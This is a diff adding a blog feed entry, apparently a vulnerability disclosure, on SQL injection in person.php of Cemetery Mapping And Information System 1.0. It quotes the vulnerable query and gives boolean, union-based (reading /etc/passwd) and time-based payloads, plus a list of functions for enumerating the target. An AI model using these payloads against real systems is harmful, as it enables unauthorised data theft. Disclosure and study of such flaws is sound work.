@@ -4,6 +4,33 @@
   
     
     <entry>
+      <title>Cemetery Mapping And Information System 1.0 SQL Injection</title>
+      <link href="2021/01/13/Cemetery-Mapping-And-Information-System-1-0-SQL-Injection/"/>
+      <url>2021/01/13/Cemetery-Mapping-And-Information-System-1-0-SQL-Injection/</url>
+      
+        <content type="html"><![CDATA[<h3 id="Cemetery-Mapping-And-Information-System-1-0-SQL-Injection"><a href="#Cemetery-Mapping-And-Information-System-1-0-SQL-Injection" class="headerlink" title="Cemetery Mapping And Information System 1.0 SQL Injection"></a>Cemetery Mapping And Information System 1.0 SQL Injection</h3><p>SQL Injection is a type of an injection attack that makes it possible to execute malicious SQL statements. Due to unsanitized user input, the attacker can retrieve the entire SQL database in this case.  </p><p>Explanation:  </p><p>The function “person.php” takes user input through the search bar at line 45:  </p><p>“$_POST[‘search’]”  </p><p>and uses it without any sanitization for the following SQL statement (line 46-49):  </p><p>$sql = “SELECT * FROM tblpeople WHERE FNAME LIKE ‘%”.$search.”%’”;<br>$mydb-&gt;setQuery($sql);<br>$cur = $mydb-&gt;executeQuery();<br>$numrows = $mydb-&gt;num_rows($cur);//get the number of count  </p><p>A single quote (‘) at the search bar under <a href="http://localhost/CemeteryMapping/index.php?q=person">http://localhost/CemeteryMapping/index.php?q=person</a> will result in SQL synthax errors.  </p><p>Proof of Concept:  </p><p>Since the php code lacks of sanitization of the user input, multiple SQL injection queries can be found.  </p><ol><li>Boolean-based SQL injection  </li></ol><p>POST request the page /CemeteryMapping/index.php?q=person and use as payload: ‘ or 1=1 –  </p><p>search=’ or 1=1 –  </p><ol start="2"><li>Union-based SQL injection  </li></ol><p>To retrieve sensitive files like /etc/passwd, use the following payload at the search bar (POST request <a href="http://localhost/CemeteryMapping/index.php?q=person">http://localhost/CemeteryMapping/index.php?q=person</a>):  </p><p>search=’ UNION SELECT NULL,load_file(‘/etc/passwd’),NULL,NULL,NULL,NULL,NULL– -  </p><p>If you want to enumerate the target system further, replace “load_file(‘/etc/passwd’)” with one of the following MySQL commands:  </p><p>@@hostname : Current Hostname  </p><p>@@tmpdir : Temp Directory  </p><p>@@datadir : Data Directory  </p><p>@@version : Version of DB  </p><p>@@basedir : Base Directory  </p><p>user() : Current User  </p><p>database() : Current Database  </p><p>version() : Version  </p><p>schema() : current Database  </p><p>UUID() : System UUID key  </p><p>current_user() : Current User  </p><p>current_user : Current User  </p><p>system_user() : Current System user  </p><p>session_user() : Session user  </p><p>@@GLOBAL.have_symlink : Check if Symlink is enabled or disabled  </p><p>@@GLOBAL.have_ssl : Check if it have SSL or not  </p><ol start="3"><li>Time-based SQL injection  </li></ol><p>For time-based SQL injection, use the payload: ‘ AND (SELECT 2634 FROM (SELECT(SLEEP(5)))muaN)– -  </p>]]></content>
+      
+      
+      <categories>
+          
+          <category> Exploit </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> poc </tag>
+            
+            <tag> SQL Injection </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>Exploit Backdoor.Win32.Zombam.a Remote Stack Buffer Overflow</title>
       <link href="2021/01/13/Exploit-Backdoor-Win32-Zombam-a-Remote-Stack-Buffer-Overflow/"/>
       <url>2021/01/13/Exploit-Backdoor-Win32-Zombam-a-Remote-Stack-Buffer-Overflow/</url>
